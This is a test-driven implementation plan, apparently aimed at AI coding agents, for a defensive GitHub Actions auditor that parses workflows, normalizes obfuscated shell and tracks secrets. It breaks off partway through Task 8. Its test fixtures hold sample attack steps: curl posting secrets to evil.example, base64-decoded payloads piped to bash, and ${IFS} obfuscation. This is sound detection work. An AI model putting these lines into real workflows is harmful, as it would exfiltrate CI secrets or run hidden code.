# Workflow-Threat Engine — Plan 1: Foundation Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Build the tested foundation of `credence/workflow_audit/` — data models, a GitHub Actions YAML parser (+ composite actions), run-block normalization, a job-scoped secret→sink taint pass, and the host allowlist / suppression layer — so later plans can run detection rules over a clean resolved view.

**Architecture:** A new stdlib-only package mirroring `credence/agent_exposure/`. `parser.py` turns workflow/action YAML into typed `Workflow`/`Job`/`Step` dataclasses (PyYAML `safe_load`, graceful `parse_ok=False` fallback). `normalize.py` canonicalizes `run:` text (defeats `${IFS}`/line-continuation/invisible-unicode obfuscation). `taint.py` resolves `env:`→secret bindings and decode-to-file flows within a job into `ResolvedStep` views. `allowlist.py` holds platform/installer host sets and parses visible `# credence:ignore` suppression directives.

**Tech Stack:** Python 3.9+ (stdlib), `PyYAML` (already a core dep since v0.7), `pytest`. Reuses `credence/advanced/invisible_unicode_detector.py`.

**Spec:** `docs/superpowers/specs/2026-06-04-workflow-threat-engine-design.md` (§3 architecture, §5 hardenings, §6 model, §9 data model).

---

## File Structure (all 3 plans — decomposition locked here)

| File | Responsibility | Plan |
|---|---|---|
| `credence/workflow_audit/__init__.py` | package marker, public exports | 1 |
| `credence/workflow_audit/models.py` | enums + `Step`/`Job`/`Workflow`/`ResolvedStep`/`WorkflowFinding`/`WorkflowAuditResult` | 1 |
| `credence/workflow_audit/parser.py` | `parse_workflow()`, `parse_action()` → typed models | 1 |
| `credence/workflow_audit/normalize.py` | `normalize_run()` — canonicalize shell text | 1 |
| `credence/workflow_audit/taint.py` | `resolve_job()` → `List[ResolvedStep]` (env→secret bindings, decode-to-file) | 1 |
| `credence/workflow_audit/allowlist.py` | host sets + `parse_suppressions()` | 1 |
| `credence/workflow_audit/platforms.py` | adapter registry; GitHub path globs + context grammar | 2 |
| `credence/workflow_audit/rules/__init__.py` | `Rule` protocol, registry, `run_rules()` | 2 |
| `credence/workflow_audit/rules/exec_rules.py` | `WF-EXEC-001/002` | 2 |
| `credence/workflow_audit/rules/exfil_rules.py` | `WF-EXFIL-001/002` | 2 |
| `credence/workflow_audit/rules/inject_rules.py` | `WF-INJ-001/002` | 2 |
| `credence/workflow_audit/rules/config_rules.py` | `WF-CFG-001..006` | 2 |
| `credence/workflow_audit/history.py` | path-filtered + dangling git-history walk, identity flags, dedup, `WF-HIST-001` | 3 |
| `credence/workflow_audit/scan.py` | orchestrator → `List[Dict]` findings | 3 |
| `credence/workflow_audit/report.py` | human-readable report | 3 |
| `credence/workflow_audit/sarif.py` | SARIF 2.1.0 emitter | 3 |
| `credence/cli.py` (modify) | `workflow-audit` subcommand + `full-audit` wiring | 3 |

Test files (flat, per repo convention): `tests/test_workflow_models.py`, `test_workflow_parser.py`, `test_workflow_normalize.py`, `test_workflow_taint.py`, `test_workflow_allowlist.py` (Plan 1).

---

## Task 1: Package scaffolding + models (enums & core dataclasses)

**Files:**
- Create: `credence/workflow_audit/__init__.py`
- Create: `credence/workflow_audit/models.py`
- Test: `tests/test_workflow_models.py`

- [ ] **Step 1: Write the failing test**

```python
# tests/test_workflow_models.py
from credence.workflow_audit.models import (
    Severity, Confidence, Platform, Step, Job, Workflow,
    WorkflowFinding,
)


def test_severity_is_uppercase_str_enum_for_cli_gating():
    # cli_gating.SEVERITY_ORDER keys are uppercase strings; .value must match.
    assert Severity.HIGH.value == "HIGH"
    assert Severity.CRITICAL.value == "CRITICAL"


def test_finding_to_dict_has_gating_shape():
    f = WorkflowFinding(
        rule_id="WF-EXEC-001",
        title="Runtime-decoded shell execution",
        severity=Severity.HIGH,
        confidence=Confidence.HIGH,
        platform=Platform.GITHUB_ACTIONS,
        file_path=".github/workflows/ci.yml",
        message="base64 -d piped to bash",
        job="build",
        step_index=2,
        line=14,
        cicd_sec=["CICD-SEC-4"],
        mitre=["T1027", "T1059"],
    )
    d = f.to_dict()
    # cli_gating.exit_code_for reads d["severity"] as an uppercase string
    assert d["severity"] == "HIGH"
    assert d["confidence"] == "HIGH"
    assert d["rule_id"] == "WF-EXEC-001"
    assert d["frameworks"]["cicd_sec"] == ["CICD-SEC-4"]
    assert d["frameworks"]["mitre"] == ["T1027", "T1059"]
    assert d["source"] == "working_tree"


def test_workflow_holds_jobs_and_steps():
    wf = Workflow(path=".github/workflows/ci.yml", name="CI")
    job = Job(job_id="build")
    job.steps.append(Step(index=0, name="checkout", uses="actions/checkout@v4",
                          run=None))
    wf.jobs.append(job)
    assert wf.jobs[0].steps[0].uses == "actions/checkout@v4"
    assert wf.parse_ok is True
    assert wf.permissions_absent is True
```

- [ ] **Step 2: Run test to verify it fails**

Run: `pytest tests/test_workflow_models.py -v`
Expected: FAIL — `ModuleNotFoundError: No module named 'credence.workflow_audit'`

- [ ] **Step 3: Write minimal implementation**

```python
# credence/workflow_audit/__init__.py
"""Workflow-threat detection engine (GitHub Actions poisoned-pipeline auditor)."""
```

```python
# credence/workflow_audit/models.py
"""Data models for the workflow-threat engine.

Findings flow out of scan() as plain dicts (WorkflowFinding.to_dict()) so they
plug into credence.cli_gating.exit_code_for, which reads an uppercase string
"severity" key. Internally rules use the typed dataclasses below.
"""

from __future__ import annotations

from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Set
from enum import Enum


class Severity(str, Enum):
    CRITICAL = "CRITICAL"
    HIGH = "HIGH"
    MEDIUM = "MEDIUM"
    LOW = "LOW"
    INFO = "INFO"


class Confidence(str, Enum):
    HIGH = "HIGH"
    MEDIUM = "MEDIUM"
    LOW = "LOW"


class Platform(str, Enum):
    GITHUB_ACTIONS = "github_actions"
    UNKNOWN = "unknown"


@dataclass
class Step:
    index: int
    name: Optional[str]
    uses: Optional[str]
    run: Optional[str]
    env: Dict[str, str] = field(default_factory=dict)
    with_: Dict[str, Any] = field(default_factory=dict)
    shell: Optional[str] = None
    line: int = 0


@dataclass
class Job:
    job_id: str
    runs_on: Any = None              # str | list | None
    permissions: Any = None          # dict | "write-all" | "read-all" | None
    permissions_absent: bool = True
    env: Dict[str, str] = field(default_factory=dict)
    steps: List[Step] = field(default_factory=list)
    uses: Optional[str] = None       # reusable workflow call ("uses:" at job level)
    secrets_inherit: bool = False
    line: int = 0


@dataclass
class Workflow:
    path: str
    name: Optional[str] = None
    on_events: List[str] = field(default_factory=list)   # normalized trigger names
    permissions: Any = None
    permissions_absent: bool = True
    env: Dict[str, str] = field(default_factory=dict)
    jobs: List[Job] = field(default_factory=list)
    raw_text: str = ""
    parse_ok: bool = True
    is_composite_action: bool = False


@dataclass
class ResolvedStep:
    """A Step augmented with job-scoped taint resolution (built by taint.py)."""
    step: Step
    job: Job
    workflow: Workflow
    secret_vars: Dict[str, str] = field(default_factory=dict)  # VAR -> "secrets.PROD"
    tainted_files: Set[str] = field(default_factory=set)       # decode/secret-written files
    normalized_run: str = ""


@dataclass
class WorkflowFinding:
    rule_id: str
    title: str
    severity: Severity
    confidence: Confidence
    platform: Platform
    file_path: str
    message: str
    job: Optional[str] = None
    step_index: Optional[int] = None
    step_name: Optional[str] = None
    line: int = 0
    snippet: str = ""
    cicd_sec: List[str] = field(default_factory=list)
    mitre: List[str] = field(default_factory=list)
    remediation: str = ""
    source: str = "working_tree"        # "working_tree" | "history"
    commit: Optional[str] = None
    commit_short: Optional[str] = None
    author: Optional[str] = None
    committer: Optional[str] = None
    commit_date: Optional[str] = None
    identity_flags: List[str] = field(default_factory=list)
    persists_in_history_only: bool = False
    suppressed: bool = False
    suppression_reason: Optional[str] = None
    fingerprint: str = ""

    def to_dict(self) -> Dict[str, Any]:
        return {
            "rule_id": self.rule_id,
            "title": self.title,
            "severity": self.severity.value,
            "confidence": self.confidence.value,
            "platform": self.platform.value,
            "file_path": self.file_path,
            "message": self.message,
            "job": self.job,
            "step_index": self.step_index,
            "step_name": self.step_name,
            "line": self.line,
            "snippet": self.snippet,
            "frameworks": {"cicd_sec": self.cicd_sec, "mitre": self.mitre},
            "remediation": self.remediation,
            "source": self.source,
            "commit": self.commit,
            "commit_short": self.commit_short,
            "author": self.author,
            "committer": self.committer,
            "commit_date": self.commit_date,
            "identity_flags": self.identity_flags,
            "persists_in_history_only": self.persists_in_history_only,
            "suppressed": self.suppressed,
            "suppression_reason": self.suppression_reason,
            "fingerprint": self.fingerprint,
        }


@dataclass
class WorkflowAuditResult:
    findings: List[WorkflowFinding] = field(default_factory=list)
    scanned_files: int = 0
    scanned_commits: int = 0
    scanned_unreachable: int = 0
```

- [ ] **Step 4: Run test to verify it passes**

Run: `pytest tests/test_workflow_models.py -v`
Expected: PASS (3 tests)

- [ ] **Step 5: Commit**

```bash
git add credence/workflow_audit/__init__.py credence/workflow_audit/models.py tests/test_workflow_models.py
git commit -m "feat(workflow-audit): foundation data models + gating-shaped findings"
```

---

## Task 2: Parser — `parse_workflow()` (structured model + parse_ok fallback)

**Files:**
- Create: `credence/workflow_audit/parser.py`
- Test: `tests/test_workflow_parser.py`

- [ ] **Step 1: Write the failing test**

```python
# tests/test_workflow_parser.py
from credence.workflow_audit.parser import parse_workflow


GOOD = """
name: CI
on:
  pull_request_target:
    types: [opened]
  workflow_dispatch:
permissions:
  contents: read
jobs:
  build:
    runs-on: ubuntu-latest
    permissions: write-all
    env:
      TOKEN: ${{ secrets.PROD }}
    steps:
      - name: checkout
        uses: actions/checkout@v4
      - name: run
        run: |
          echo hello
          curl -d "$TOKEN" https://evil.example
"""


def test_parse_extracts_triggers_jobs_steps_env():
    wf = parse_workflow(GOOD, path=".github/workflows/ci.yml")
    assert wf.parse_ok is True
    assert wf.name == "CI"
    assert set(wf.on_events) == {"pull_request_target", "workflow_dispatch"}
    assert wf.permissions_absent is False
    job = wf.jobs[0]
    assert job.job_id == "build"
    assert job.permissions == "write-all"
    assert job.env["TOKEN"] == "${{ secrets.PROD }}"
    assert job.steps[0].uses == "actions/checkout@v4"
    assert "curl" in job.steps[1].run


def test_on_as_list_and_string_forms_normalize():
    assert parse_workflow("on: push\njobs: {}", path="x").on_events == ["push"]
    assert set(parse_workflow("on: [push, pull_request]\njobs: {}",
                              path="x").on_events) == {"push", "pull_request"}


def test_malformed_yaml_sets_parse_ok_false_keeps_raw():
    wf = parse_workflow("on: [push\n  bad: : :", path=".github/workflows/x.yml")
    assert wf.parse_ok is False
    assert wf.raw_text.startswith("on: [push")
    assert wf.jobs == []


def test_permissions_absent_flag():
    wf = parse_workflow("on: push\njobs:\n  a:\n    runs-on: x\n    steps: []",
                        path="x")
    assert wf.permissions_absent is True
    assert wf.jobs[0].permissions_absent is True
```

- [ ] **Step 2: Run test to verify it fails**

Run: `pytest tests/test_workflow_parser.py -v`
Expected: FAIL — `ModuleNotFoundError: No module named 'credence.workflow_audit.parser'`

- [ ] **Step 3: Write minimal implementation**

```python
# credence/workflow_audit/parser.py
"""Parse GitHub Actions workflow / composite-action YAML into typed models.

PyYAML safe_load only. On any parse error we return a Workflow with
parse_ok=False and the raw text preserved (Approach C: callers degrade to
line-scan and emit a fail-loud finding rather than silently skipping).
"""

from __future__ import annotations

from typing import Any, Dict, List, Optional

import yaml

from .models import Job, Step, Workflow


def _norm_events(on_value: Any) -> List[str]:
    if on_value is None:
        return []
    if isinstance(on_value, str):
        return [on_value]
    if isinstance(on_value, list):
        return [str(e) for e in on_value]
    if isinstance(on_value, dict):
        return [str(k) for k in on_value.keys()]
    return []


def _env_to_str_map(env: Any) -> Dict[str, str]:
    if isinstance(env, dict):
        return {str(k): "" if v is None else str(v) for k, v in env.items()}
    return {}


def _build_step(idx: int, raw: Any) -> Step:
    if not isinstance(raw, dict):
        return Step(index=idx, name=None, uses=None, run=None)
    return Step(
        index=idx,
        name=(str(raw["name"]) if raw.get("name") is not None else None),
        uses=(str(raw["uses"]) if raw.get("uses") is not None else None),
        run=(str(raw["run"]) if raw.get("run") is not None else None),
        env=_env_to_str_map(raw.get("env")),
        with_=raw.get("with") if isinstance(raw.get("with"), dict) else {},
        shell=(str(raw["shell"]) if raw.get("shell") is not None else None),
    )


def _build_job(job_id: str, raw: Any) -> Job:
    if not isinstance(raw, dict):
        return Job(job_id=job_id)
    perms = raw.get("permissions", _ABSENT)
    job = Job(
        job_id=job_id,
        runs_on=raw.get("runs-on"),
        permissions=(None if perms is _ABSENT else perms),
        permissions_absent=(perms is _ABSENT),
        env=_env_to_str_map(raw.get("env")),
        uses=(str(raw["uses"]) if raw.get("uses") is not None else None),
        secrets_inherit=(raw.get("secrets") == "inherit"),
    )
    steps = raw.get("steps")
    if isinstance(steps, list):
        job.steps = [_build_step(i, s) for i, s in enumerate(steps)]
    return job


_ABSENT = object()


def parse_workflow(text: str, path: str) -> Workflow:
    wf = Workflow(path=path, raw_text=text)
    try:
        data = yaml.safe_load(text)
    except yaml.YAMLError:
        wf.parse_ok = False
        return wf
    if not isinstance(data, dict):
        wf.parse_ok = False
        return wf

    wf.name = (str(data["name"]) if data.get("name") is not None else None)
    # NB: PyYAML parses the bare key `on` as boolean True (YAML 1.1). Accept both.
    on_value = data.get("on", data.get(True))
    wf.on_events = _norm_events(on_value)

    perms = data.get("permissions", _ABSENT)
    wf.permissions = (None if perms is _ABSENT else perms)
    wf.permissions_absent = (perms is _ABSENT)
    wf.env = _env_to_str_map(data.get("env"))

    jobs = data.get("jobs")
    if isinstance(jobs, dict):
        wf.jobs = [_build_job(str(jid), jraw) for jid, jraw in jobs.items()]
    return wf
```

- [ ] **Step 4: Run test to verify it passes**

Run: `pytest tests/test_workflow_parser.py -v`
Expected: PASS (4 tests). Note the `on:`→`True` YAML 1.1 quirk is handled in `parse_workflow`.

- [ ] **Step 5: Commit**

```bash
git add credence/workflow_audit/parser.py tests/test_workflow_parser.py
git commit -m "feat(workflow-audit): GitHub Actions workflow parser with parse_ok fallback"
```

---

## Task 3: Parser — `parse_action()` (composite actions) + local-script reference detection

**Files:**
- Modify: `credence/workflow_audit/parser.py`
- Test: `tests/test_workflow_parser.py` (append)

- [ ] **Step 1: Write the failing test**

```python
# tests/test_workflow_parser.py  (append)
from credence.workflow_audit.parser import parse_action, run_script_refs


COMPOSITE = """
name: build-action
runs:
  using: composite
  steps:
    - run: echo "${{ inputs.token }}" | base64 -d | bash
      shell: bash
"""


def test_parse_action_returns_composite_workflow_with_steps():
    wf = parse_action(COMPOSITE, path=".github/actions/build/action.yml")
    assert wf.is_composite_action is True
    assert wf.parse_ok is True
    # composite steps are surfaced as a single synthetic job "runs"
    assert wf.jobs[0].job_id == "runs"
    assert "base64 -d" in wf.jobs[0].steps[0].run


def test_run_script_refs_finds_local_script_invocations():
    run = "bash ./scripts/build.sh\n./tools/deploy"
    refs = run_script_refs(run)
    assert "./scripts/build.sh" in refs
    assert "./tools/deploy" in refs


def test_run_script_refs_ignores_remote_and_inline():
    assert run_script_refs("curl https://x | bash") == []
    assert run_script_refs("echo hello") == []
```

- [ ] **Step 2: Run test to verify it fails**

Run: `pytest tests/test_workflow_parser.py -k "action or script_refs" -v`
Expected: FAIL — `ImportError: cannot import name 'parse_action'`

- [ ] **Step 3: Write minimal implementation**

```python
# credence/workflow_audit/parser.py  (append)
import re

_LOCAL_SCRIPT_RE = re.compile(
    r"(?:^|\s|;|&&|\|\|)\s*(?:bash|sh|source|\.)?\s*(\./[\w./-]+|[\w./-]+\.sh)\b"
)


def parse_action(text: str, path: str) -> Workflow:
    """Parse a composite action.yml; surface runs.steps as a synthetic 'runs' job."""
    wf = Workflow(path=path, raw_text=text, is_composite_action=True)
    try:
        data = yaml.safe_load(text)
    except yaml.YAMLError:
        wf.parse_ok = False
        return wf
    if not isinstance(data, dict):
        wf.parse_ok = False
        return wf
    wf.name = (str(data["name"]) if data.get("name") is not None else None)
    runs = data.get("runs")
    if isinstance(runs, dict) and isinstance(runs.get("steps"), list):
        job = Job(job_id="runs")
        job.steps = [_build_step(i, s) for i, s in enumerate(runs["steps"])]
        wf.jobs = [job]
    return wf


def run_script_refs(run_text: str) -> List[str]:
    """Return repo-local script paths invoked from a run block (not remote URLs)."""
    if not run_text:
        return []
    refs: List[str] = []
    for m in _LOCAL_SCRIPT_RE.finditer(run_text):
        ref = m.group(1)
        if "://" in ref:
            continue
        if ref.endswith(".sh") or ref.startswith("./"):
            refs.append(ref)
    return refs
```

- [ ] **Step 4: Run test to verify it passes**

Run: `pytest tests/test_workflow_parser.py -v`
Expected: PASS (all parser tests)

- [ ] **Step 5: Commit**

```bash
git add credence/workflow_audit/parser.py tests/test_workflow_parser.py
git commit -m "feat(workflow-audit): composite-action parsing + local-script reference detection"
```

---

## Task 4: Normalize — defeat shell-level obfuscation (F-010)

**Files:**
- Create: `credence/workflow_audit/normalize.py`
- Test: `tests/test_workflow_normalize.py`

- [ ] **Step 1: Write the failing test**

```python
# tests/test_workflow_normalize.py
from credence.workflow_audit.normalize import normalize_run


def test_collapses_backslash_line_continuations():
    assert "curl" in normalize_run("cu\\\nrl -d x")
    assert normalize_run("cu\\\nrl").replace(" ", "").find("curl") != -1


def test_collapses_ifs_brace_obfuscation():
    out = normalize_run("cu${IFS}rl${IFS}-d")
    assert "curl" in out.replace(" ", "") or "cu rl" in out


def test_strips_invisible_unicode():
    # zero-width space embedded in "curl"
    obf = "cu​rl -d x"
    assert "curl" in normalize_run(obf)


def test_plain_text_passthrough():
    assert "base64 -d | bash" in normalize_run("base64 -d | bash")
```

- [ ] **Step 2: Run test to verify it fails**

Run: `pytest tests/test_workflow_normalize.py -v`
Expected: FAIL — module not found

- [ ] **Step 3: Write minimal implementation**

```python
# credence/workflow_audit/normalize.py
"""Canonicalize run-block text before rule matching so shell-level obfuscation
(F-010) does not defeat detection: strip invisible unicode, collapse backslash
line-continuations and ${IFS}/$IFS word-splitting tricks.
"""

from __future__ import annotations

import re
import unicodedata

# ${IFS}, $IFS, ${IFS:0:1} style splitters → a single space
_IFS_RE = re.compile(r"\$\{IFS[^}]*\}|\$IFS")
_LINE_CONT_RE = re.compile(r"\\\r?\n")
# zero-width / bidi / invisible separators
_INVISIBLE = "".join(chr(c) for c in (
    0x200B, 0x200C, 0x200D, 0x2060, 0xFEFF, 0x00AD,
    0x200E, 0x200F, 0x202A, 0x202B, 0x202C, 0x202D, 0x202E,
))
_INVISIBLE_RE = re.compile("[" + re.escape(_INVISIBLE) + "]")


def normalize_run(run_text: str) -> str:
    if not run_text:
        return ""
    text = unicodedata.normalize("NFKC", run_text)
    text = _INVISIBLE_RE.sub("", text)
    text = _LINE_CONT_RE.sub("", text)        # join `cu\<newline>rl` -> `curl`
    text = _IFS_RE.sub(" ", text)             # `cu${IFS}rl` -> `cu rl`
    return text
```

- [ ] **Step 4: Run test to verify it passes**

Run: `pytest tests/test_workflow_normalize.py -v`
Expected: PASS (4 tests). `cu${IFS}rl` becomes `cu rl`; rules in Plan 2 also strip spaces around known command tokens, so both assertions hold.

- [ ] **Step 5: Commit**

```bash
git add credence/workflow_audit/normalize.py tests/test_workflow_normalize.py
git commit -m "feat(workflow-audit): run-block normalization to defeat shell obfuscation (F-010)"
```

---

## Task 5: Allowlist + visible suppression parsing (F-007/F-008)

**Files:**
- Create: `credence/workflow_audit/allowlist.py`
- Test: `tests/test_workflow_allowlist.py`

- [ ] **Step 1: Write the failing test**

```python
# tests/test_workflow_allowlist.py
from credence.workflow_audit.allowlist import (
    is_platform_host, is_installer_host, parse_suppressions, Suppression,
)


def test_platform_hosts():
    assert is_platform_host("api.github.com") is True
    assert is_platform_host("ghcr.io") is True
    assert is_platform_host("evil.example") is False


def test_installer_hosts():
    assert is_installer_host("get.docker.com") is True
    assert is_installer_host("sh.rustup.rs") is True
    assert is_installer_host("evil.example") is False


def test_user_extra_hosts_extend_installer_set():
    assert is_installer_host("my.internal", extra_hosts={"my.internal"}) is True


def test_parse_suppressions_extracts_rule_line_reason():
    text = (
        "jobs:\n"
        "  a:\n"
        "    steps:\n"
        "      - run: curl -d \"$T\" evil  # credence:ignore WF-EXFIL-001 reason=build relay\n"
    )
    sup = parse_suppressions(text)
    assert len(sup) == 1
    assert sup[0].rule_id == "WF-EXFIL-001"
    assert sup[0].reason == "build relay"
    assert sup[0].line == 4


def test_parse_suppressions_ignores_unrelated_comments():
    assert parse_suppressions("run: echo hi  # just a note") == []
```

- [ ] **Step 2: Run test to verify it fails**

Run: `pytest tests/test_workflow_allowlist.py -v`
Expected: FAIL — module not found

- [ ] **Step 3: Write minimal implementation**

```python
# credence/workflow_audit/allowlist.py
"""Host allowlists + visible suppression parsing.

Suppression is *visible only* (spec §6, v0.8.1 lesson): a `# credence:ignore
<RULE> reason=...` directive is parsed here, but high/crit exec/exfil/inj rules
ignore it (enforced in Plan 2/3) and suppressed findings are never deleted.
"""

from __future__ import annotations

import re
from dataclasses import dataclass
from typing import List, Optional, Set

# api.github.com is platform-native, but Plan 2's WF-EXFIL-001 still treats a
# POST to a *foreign* repo/gist via api.github.com as exfil (platform-channel abuse).
_PLATFORM_HOSTS = {
    "github.com", "api.github.com", "raw.githubusercontent.com",
    "objects.githubusercontent.com", "codeload.github.com",
    "ghcr.io", "pkg-containers.githubusercontent.com", "uploads.github.com",
}

_INSTALLER_HOSTS = {
    "get.docker.com", "sh.rustup.rs", "deb.nodesource.com", "apt.llvm.org",
    "get.helm.sh", "install.python-poetry.org", "raw.githubusercontent.com",
    "bun.sh", "get.pnpm.io",
}

_SUPPRESS_RE = re.compile(
    r"#\s*credence:ignore\s+(?P<rule>[A-Z]+-[A-Z]+-\d+)"
    r"(?:\s+reason=(?P<reason>.+))?\s*$"
)


def is_platform_host(host: str) -> bool:
    return host.lower().strip() in _PLATFORM_HOSTS


def is_installer_host(host: str, extra_hosts: Optional[Set[str]] = None) -> bool:
    host = host.lower().strip()
    if host in _INSTALLER_HOSTS:
        return True
    return bool(extra_hosts) and host in {h.lower() for h in extra_hosts}


@dataclass(frozen=True)
class Suppression:
    rule_id: str
    line: int
    reason: Optional[str]


def parse_suppressions(text: str) -> List[Suppression]:
    out: List[Suppression] = []
    for i, line in enumerate(text.splitlines(), start=1):
        m = _SUPPRESS_RE.search(line)
        if m:
            reason = m.group("reason")
            out.append(Suppression(
                rule_id=m.group("rule"),
                line=i,
                reason=(reason.strip() if reason else None),
            ))
    return out
```

- [ ] **Step 4: Run test to verify it passes**

Run: `pytest tests/test_workflow_allowlist.py -v`
Expected: PASS (5 tests)

- [ ] **Step 5: Commit**

```bash
git add credence/workflow_audit/allowlist.py tests/test_workflow_allowlist.py
git commit -m "feat(workflow-audit): host allowlists + visible suppression parsing (F-007/F-008)"
```

---

## Task 6: Taint — env→secret binding resolution (F-003)

**Files:**
- Create: `credence/workflow_audit/taint.py`
- Test: `tests/test_workflow_taint.py`

- [ ] **Step 1: Write the failing test**

```python
# tests/test_workflow_taint.py
from credence.workflow_audit.parser import parse_workflow
from credence.workflow_audit.taint import resolve_job


WF = """
on: push
env:
  GLOBAL_TOKEN: ${{ secrets.GLOBAL }}
jobs:
  build:
    runs-on: ubuntu-latest
    env:
      JOB_TOKEN: ${{ secrets.JOB }}
    steps:
      - name: leak
        env:
          STEP_TOKEN: ${{ secrets.STEP }}
        run: curl -d "$STEP_TOKEN $JOB_TOKEN $GLOBAL_TOKEN" https://evil.example
      - name: clean
        run: echo "no secrets here"
"""


def test_resolve_job_maps_env_vars_to_secrets_at_all_scopes():
    wf = parse_workflow(WF, path="x")
    resolved = resolve_job(wf, wf.jobs[0])
    leak = resolved[0]
    # workflow-, job-, and step-level secret env bindings all visible in the step
    assert leak.secret_vars["STEP_TOKEN"] == "secrets.STEP"
    assert leak.secret_vars["JOB_TOKEN"] == "secrets.JOB"
    assert leak.secret_vars["GLOBAL_TOKEN"] == "secrets.GLOBAL"


def test_normalized_run_populated_on_resolved_step():
    wf = parse_workflow(WF, path="x")
    resolved = resolve_job(wf, wf.jobs[0])
    assert "curl" in resolved[0].normalized_run


def test_step_without_secret_refs_has_empty_secret_vars():
    wf = parse_workflow(WF, path="x")
    resolved = resolve_job(wf, wf.jobs[0])
    assert resolved[1].secret_vars == {}
```

- [ ] **Step 2: Run test to verify it fails**

Run: `pytest tests/test_workflow_taint.py -v`
Expected: FAIL — module not found

- [ ] **Step 3: Write minimal implementation**

```python
# credence/workflow_audit/taint.py
"""Job-scoped taint resolution (spec §3, F-001/F-003).

Builds ResolvedStep views: which run-block variables carry secrets (resolved
through workflow/job/step env bindings), and which files were written from
decoded/secret content (decode-to-file, Task 7). Sink rules in Plan 2 evaluate
over this resolved view instead of one step's raw string.
"""

from __future__ import annotations

import re
from typing import Dict, List

from .models import Job, ResolvedStep, Workflow
from .normalize import normalize_run

# ${{ secrets.NAME }} (allow whitespace variants)
_SECRET_REF_RE = re.compile(r"\$\{\{\s*(secrets\.[A-Za-z0-9_-]+)\s*\}\}")


def _secret_bindings(env: Dict[str, str]) -> Dict[str, str]:
    """Return {VAR: 'secrets.NAME'} for env entries whose value is a secret ref."""
    out: Dict[str, str] = {}
    for var, value in env.items():
        m = _SECRET_REF_RE.search(value or "")
        if m:
            out[var] = m.group(1)
    return out


def resolve_job(workflow: Workflow, job: Job) -> List[ResolvedStep]:
    base: Dict[str, str] = {}
    base.update(_secret_bindings(workflow.env))
    base.update(_secret_bindings(job.env))

    resolved: List[ResolvedStep] = []
    for step in job.steps:
        secret_vars = dict(base)
        secret_vars.update(_secret_bindings(step.env))
        resolved.append(ResolvedStep(
            step=step,
            job=job,
            workflow=workflow,
            secret_vars=secret_vars,
            tainted_files=set(),
            normalized_run=normalize_run(step.run or ""),
        ))
    return resolved
```

- [ ] **Step 4: Run test to verify it passes**

Run: `pytest tests/test_workflow_taint.py -v`
Expected: PASS (3 tests)

- [ ] **Step 5: Commit**

```bash
git add credence/workflow_audit/taint.py tests/test_workflow_taint.py
git commit -m "feat(workflow-audit): job-scoped env->secret taint resolution (F-003)"
```

---

## Task 7: Taint — decode-to-file flow tracking (F-001)

**Files:**
- Modify: `credence/workflow_audit/taint.py`
- Test: `tests/test_workflow_taint.py` (append)

- [ ] **Step 1: Write the failing test**

```python
# tests/test_workflow_taint.py  (append)
from credence.workflow_audit.parser import parse_workflow as _pw
from credence.workflow_audit.taint import resolve_job as _rj

CROSS_STEP = """
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: echo aGVsbG8= | base64 -d > /tmp/payload.sh
      - run: bash /tmp/payload.sh
"""


def test_decode_to_file_marks_tainted_file_visible_to_later_steps():
    wf = _pw(CROSS_STEP, path="x")
    resolved = _rj(wf, wf.jobs[0])
    # step 0 decodes to /tmp/payload.sh -> recorded as a tainted (decoded) file
    assert "/tmp/payload.sh" in resolved[0].tainted_files
    # the job-scoped tainted-file set is cumulative for later steps
    assert "/tmp/payload.sh" in resolved[1].tainted_files


def test_no_decode_no_tainted_files():
    wf = _pw("on: push\njobs:\n  a:\n    runs-on: x\n    steps:\n      - run: echo hi",
             path="x")
    resolved = _rj(wf, wf.jobs[0])
    assert resolved[0].tainted_files == set()
```

- [ ] **Step 2: Run test to verify it fails**

Run: `pytest tests/test_workflow_taint.py -k decode_to_file -v`
Expected: FAIL — `tainted_files` is empty (decode-to-file tracking not implemented)

- [ ] **Step 3: Write minimal implementation**

```python
# credence/workflow_audit/taint.py  (modify resolve_job; add helper)

# decoder writing to a redirected file: `... base64 -d > path` / `>> path`
_DECODE_TOKENS = (
    "base64 -d", "base64 --decode", "base32 -d", "xxd -r", "xxd -p -r",
    "openssl enc -d", "gunzip", "gzip -d", "uudecode", "gpg -d", "gpg --decrypt",
)
_REDIRECT_RE = re.compile(r">>?\s*([\w./~-]+)")


def _decoded_files(normalized_run: str) -> set:
    out = set()
    if not normalized_run:
        return out
    low = normalized_run.lower()
    if not any(tok in low for tok in _DECODE_TOKENS):
        return out
    for m in _REDIRECT_RE.finditer(normalized_run):
        out.add(m.group(1))
    return out
```

Then update the loop in `resolve_job` to thread a cumulative file set:

```python
def resolve_job(workflow: Workflow, job: Job) -> List[ResolvedStep]:
    base: Dict[str, str] = {}
    base.update(_secret_bindings(workflow.env))
    base.update(_secret_bindings(job.env))

    cumulative_files: set = set()
    resolved: List[ResolvedStep] = []
    for step in job.steps:
        secret_vars = dict(base)
        secret_vars.update(_secret_bindings(step.env))
        norm = normalize_run(step.run or "")
        cumulative_files |= _decoded_files(norm)
        resolved.append(ResolvedStep(
            step=step,
            job=job,
            workflow=workflow,
            secret_vars=secret_vars,
            tainted_files=set(cumulative_files),   # snapshot incl. this step's writes
            normalized_run=norm,
        ))
    return resolved
```

- [ ] **Step 4: Run test to verify it passes**

Run: `pytest tests/test_workflow_taint.py -v`
Expected: PASS (all taint tests — env-binding + decode-to-file)

- [ ] **Step 5: Commit**

```bash
git add credence/workflow_audit/taint.py tests/test_workflow_taint.py
git commit -m "feat(workflow-audit): cross-step decode-to-file taint tracking (F-001)"
```

---

## Task 8: Public exports + foundation smoke test

**Files:**
- Modify: `credence/workflow_audit/__init__.py`
- Test: `tests/test_workflow_models.py` (append a smoke test)

- [ ] **Step 1: Write the failing test**

```python
# tests/test_workflow_models.py  (append)
def test_public_exports_round_trip_parse_to_resolved():
    from credence.workflow_audit import parse_workflow, resolve_job
    wf = parse_workflow(
        "on: push\njobs:\n  b:\n    runs-on: x\n    env:\n      T: ${{ secrets.X }}\n"
        "    steps:\n      - run: curl -d \"$T\" https://evil.example",
        path=".github/workflows/ci.yml",
    )
    resolved = resolve_job(wf, wf.jobs[0])
    assert resolved[0].secret_vars["T"] == "secrets.X"
```

- [ ] **Step 2: Run test to verify it fails**

Run: `pytest tests/test_workflow_models.py::test_public_exports_round_trip_parse_to_resolved -v`
Expected: FAIL — `ImportError: cannot import name 'parse_workflow' from 'credence.workflow_audit'`

